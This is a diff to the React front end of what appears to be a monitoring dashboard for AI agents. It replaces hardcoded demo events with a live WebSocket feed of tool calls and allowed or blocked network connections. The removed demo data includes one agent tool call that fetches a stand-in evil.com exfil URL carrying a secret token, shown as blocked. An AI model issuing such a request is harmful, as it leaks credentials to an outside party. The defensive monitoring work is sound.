@@ -1,4 +1,4 @@
-import { useMemo, useState } from 'react';
+import { useEffect, useMemo, useRef, useState } from 'react';
 import './App.css';
 import Header from './components/Header.jsx';
 import AgentTabs from './components/AgentTabs.jsx';
@@ -6,84 +6,91 @@ import StatsRow from './components/StatsRow.jsx';
 import LLMPanel from './components/LLMPanel.jsx';
 import KernelPanel from './components/KernelPanel.jsx';
 
-// Hardcoded fake data so the layout renders fully on first paint.
-// Task 3 will replace these with live WebSocket events.
+const WS_URL = 'ws://localhost:8765';
+const RECONNECT_DELAY_MS = 3000;
+const MAX_EVENTS = 500;
 
-const NOW = Date.now() / 1000;
-
-const FAKE_LLM_EVENTS = [
-  { agent: 'demo-agent', type: 'stdout', ts: NOW - 12, data: { line: 'agent: starting task' } },
-  {
-    agent: 'demo-agent',
-    type: 'tool_call',
-    ts: NOW - 10,
-    data: { tool: 'fetch_url', args: { url: 'https://example.com/docs' } },
-  },
-  { agent: 'demo-agent', type: 'stdout', ts: NOW - 8, data: { line: 'agent: parsing response' } },
-  {
-    agent: 'demo-agent',
-    type: 'tool_call',
-    ts: NOW - 5,
-    data: { tool: 'fetch_url', args: { url: 'https://evil.com/exfil?token=secret' } },
-  },
-  { agent: 'demo-agent', type: 'stdout', ts: NOW - 4, data: { line: 'agent: tool returned error' } },
-  { agent: 'file-reader', type: 'stdout', ts: NOW - 3, data: { line: 'reader: opened report.pdf' } },
-  { agent: 'demo-agent', type: 'crashed', ts: NOW - 1, data: { exit_code: 1 } },
-];
-
-const FAKE_KERNEL_EVENTS = [
-  {
-    agent: 'demo-agent',
-    type: 'connect_attempt',
-    ts: NOW - 10,
-    data: { dst_ip: '93.184.216.34', dst_port: 443, hostname: 'example.com' },
-  },
-  {
-    agent: 'demo-agent',
-    type: 'connect_allowed',
-    ts: NOW - 10,
-    data: {
-      dst_ip: '93.184.216.34',
-      dst_port: 443,
-      hostname: 'example.com',
-      reason: 'in allowed_hosts',
-    },
-  },
-  {
-    agent: 'demo-agent',
-    type: 'connect_attempt',
-    ts: NOW - 5,
-    data: { dst_ip: '203.0.113.42', dst_port: 80, hostname: 'evil.com' },
-  },
-  {
-    agent: 'demo-agent',
-    type: 'connect_blocked',
-    ts: NOW - 5,
-    data: {
-      dst_ip: '203.0.113.42',
-      dst_port: 80,
-      hostname: 'evil.com',
-      reason: 'no policy match',
-    },
-  },
-  {
-    agent: 'file-reader',
-    type: 'connect_attempt',
-    ts: NOW - 2,
-    data: { dst_ip: '10.0.0.5', dst_port: 22, hostname: 'internal.lan' },
-  },
-];
-
-const FAKE_STATS = { toolCalls: 12, allowed: 9, blocked: 3, uptime: 187 };
+const LLM_TYPES = new Set(['stdout', 'tool_call', 'stopped', 'crashed']);
+const KERNEL_TYPES = new Set(['connect_attempt', 'connect_allowed', 'connect_blocked']);
 
 export default function App() {
-  // wsStatus, llmEvents, kernelEvents, activeAgent, stats: ALL state lives here.
-  // Children are pure prop-driven views — Task 3 swaps the fake arrays for live data.
-  const [wsStatus] = useState('disconnected');
-  const [llmEvents] = useState(FAKE_LLM_EVENTS);
-  const [kernelEvents] = useState(FAKE_KERNEL_EVENTS);
-  const [stats] = useState(FAKE_STATS);
-  const [activeAgent, setActiveAgent] = useState('demo-agent');
+  const [wsStatus, setWsStatus] = useState('disconnected');
+  const [llmEvents, setLlmEvents] = useState([]);
+  const [kernelEvents, setKernelEvents] = useState([]);
+  const [activeAgent, setActiveAgent] = useState(null);
+  const [uptime, setUptime] = useState(0);
+
+  const socketRef = useRef(null);
+  const reconnectTimerRef = useRef(null);
+  const cancelledRef = useRef(false);
+
+  useEffect(() => {
+    cancelledRef.current = false;
+
+    const connect = () => {
+      if (cancelledRef.current) return;
+      const ws = new WebSocket(WS_URL);
+      socketRef.current = ws;
+
+      ws.onopen = () => {
+        ws.send(JSON.stringify({ role: 'viewer' }));
+        setWsStatus('connected');
+      };
+
+      ws.onmessage = (msg) => {
+        let event;
+        try {
+          event = JSON.parse(msg.data);
+        } catch {
+          console.warn('viewer: dropped malformed message');
+          return;
+        }
+        if (!event || typeof event.type !== 'string') return;
+
+        if (LLM_TYPES.has(event.type)) {
+          setLlmEvents((prev) => [...prev, event].slice(-MAX_EVENTS));
+        } else if (KERNEL_TYPES.has(event.type)) {
+          setKernelEvents((prev) => [...prev, event].slice(-MAX_EVENTS));
+        } else {
+          console.warn('viewer: unknown event type', event.type);
+        }
+      };
+
+      ws.onerror = () => {
+        // onclose will fire next; reconnect is scheduled there.
+      };
+
+      ws.onclose = () => {
+        setWsStatus('disconnected');
+        socketRef.current = null;
+        if (cancelledRef.current) return;
+        reconnectTimerRef.current = setTimeout(connect, RECONNECT_DELAY_MS);
+      };
+    };
+
+    connect();
+
+    return () => {
+      cancelledRef.current = true;
+      if (reconnectTimerRef.current) {
+        clearTimeout(reconnectTimerRef.current);
+        reconnectTimerRef.current = null;
+      }
+      if (socketRef.current) {
+        socketRef.current.onclose = null;
+        socketRef.current.close();
+        socketRef.current = null;
+      }
+    };
+  }, []);
+
+  useEffect(() => {
+    const start = Date.now();
+    const id = setInterval(() => {
+      setUptime(Math.floor((Date.now() - start) / 1000));
+    }, 1000);
+    return () => clearInterval(id);
+  }, []);
 
   const agents = useMemo(() => {
     const names = new Set();
@@ -92,8 +99,30 @@ export default function App() {
     return Array.from(names);
   }, [llmEvents, kernelEvents]);
 
-  const filteredLlm = llmEvents.filter((e) => e.agent === activeAgent);
-  const filteredKernel = kernelEvents.filter((e) => e.agent === activeAgent);
+  useEffect(() => {
+    if (activeAgent === null && agents.length > 0) {
+      setActiveAgent(agents[0]);
+    }
+  }, [agents, activeAgent]);
+
+  const stats = useMemo(() => {
+    let toolCalls = 0;
+    for (const e of llmEvents) if (e.type === 'tool_call') toolCalls += 1;
+    let allowed = 0;
+    let blocked = 0;
+    for (const e of kernelEvents) {
+      if (e.type === 'connect_allowed') allowed += 1;
+      else if (e.type === 'connect_blocked') blocked += 1;
+    }
+    return { toolCalls, allowed, blocked, uptime };
+  }, [llmEvents, kernelEvents, uptime]);
+
+  const filteredLlm = activeAgent
+    ? llmEvents.filter((e) => e.agent === activeAgent)
+    : llmEvents;
+  const filteredKernel = activeAgent
+    ? kernelEvents.filter((e) => e.agent === activeAgent)
+    : kernelEvents;
 
   return (
     <div className="app">
